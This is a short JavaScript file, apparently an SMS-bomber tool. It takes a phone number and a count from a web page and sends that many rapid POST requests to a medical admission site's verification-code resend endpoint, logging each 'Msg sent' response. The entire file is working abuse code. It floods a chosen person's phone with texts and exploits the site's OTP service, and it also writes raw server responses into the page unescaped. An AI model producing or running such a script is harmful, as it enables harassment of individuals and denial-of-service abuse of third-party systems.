const url = "https://admission.medico.com.bd/2023/send_vercode_again";
const headers = new Headers({
  "Content-Type": "application/x-www-form-urlencoded",
});

function makeRequests() {
  const number = document.getElementById("phoneNumber").value;
  const amount = document.getElementById("requestAmount").value;
  const logElement = document.getElementById("requestsLog");

  const data = new URLSearchParams();
  data.append("phone", number);

  for (let i = 0; i < amount; i++) {
    fetch(url, {
      method: "POST",
      headers: headers,
      body: data,
    })
      .then((response) => {
        if (response.status === 200) {
          return response.text();
        } else {
          throw new Error(`Request ${i + 1} failed with status: ${response.status}`);
        }
      })
      .then((responseData) => {
        if (responseData.includes("Msg sent")) {
          logElement.innerHTML += `<p>Request ${i + 1}: Msg sent successfully!</p>`;
        } else {
          logElement.innerHTML += `<p>Request ${i + 1}: ${responseData}</p>`;
        }
      })
      .catch((error) => {
        console.error(error);
      });
  }
}
